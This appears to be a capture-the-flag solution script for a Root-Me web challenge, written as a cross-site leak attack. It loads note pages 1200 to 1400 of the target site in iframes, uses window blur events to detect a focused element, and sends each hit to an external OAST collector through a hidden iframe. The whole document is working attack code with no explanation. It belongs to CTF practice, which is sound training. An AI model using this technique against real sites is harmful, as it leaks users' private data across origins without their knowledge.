<script>
const BASE_URL = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";

window.onload = function () {
    let i = 1200;
    function testNext() {
        if (i > 1400) return;
        let blurFired = false;
        const listener = () => { blurFired = true; };
        window.addEventListener("blur", listener);
        const iframe = document.createElement("iframe");
        iframe.src = BASE_URL + i + "#search_note";
        iframe.onload = function () {
            setTimeout(() => {
                if (blurFired) {
                    const ex = document.createElement("iframe");
                    ex.src = WEBHOOK + "?result=pro_" + i;
                    ex.style.display = "none";
                    document.body.appendChild(ex);
                }
                window.removeEventListener("blur", listener);
                i++;
                testNext();
            }, 500);
        };
        document.body.appendChild(iframe);
    }
    testNext();
};
</script>
